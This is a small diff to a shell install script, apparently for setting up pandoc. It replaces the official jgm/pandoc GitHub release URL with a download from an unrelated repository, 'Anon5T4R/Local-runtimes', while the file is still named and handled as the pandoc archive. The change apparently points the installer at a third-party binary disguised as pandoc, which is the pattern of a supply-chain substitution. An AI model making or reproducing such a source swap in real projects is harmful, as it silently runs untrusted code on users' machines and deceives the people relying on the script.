@@ -24,7 +24,7 @@ if [ -f "$TARGET" ]; then
   exit 0
 fi
 
-URL="https://github.com/jgm/pandoc/releases/download/$PD_VERSION/$PD_ASSET"
+URL="https://github.com/Anon5T4R/Local-runtimes/releases/download/v1/$PD_ASSET"
 echo "Baixando $URL ..."
 curl -fsSL --retry 3 --retry-delay 2 "$URL" -o /tmp/pandoc.tar.gz
 
